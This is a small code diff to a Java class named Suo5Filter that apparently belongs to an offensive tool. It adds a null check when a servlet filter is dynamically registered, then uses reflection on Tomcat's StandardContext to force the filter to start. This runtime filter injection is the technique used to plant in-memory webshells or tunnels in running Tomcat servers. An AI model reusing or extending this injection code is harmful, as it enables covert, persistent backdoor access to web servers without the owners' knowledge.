@@ -215,7 +215,9 @@ public class Suo5Filter extends ClassLoader implements Filter, Runnable, Hostnam
             }
 
             filterRegistration = servletContext.addFilter(filterName, filter);
-            filterRegistration.addMappingForUrlPatterns(java.util.EnumSet.of(DispatcherType.REQUEST), false, new String[]{url});
+            if (filterRegistration != null) {
+                filterRegistration.addMappingForUrlPatterns(java.util.EnumSet.of(DispatcherType.REQUEST), false, new String[]{url});
+            }
             java.lang.reflect.Method filterStartMethod = org.apache.catalina.core.StandardContext.class.getMethod("filterStart");
             filterStartMethod.setAccessible(true);
             filterStartMethod.invoke(standardContext, (Object[])null);
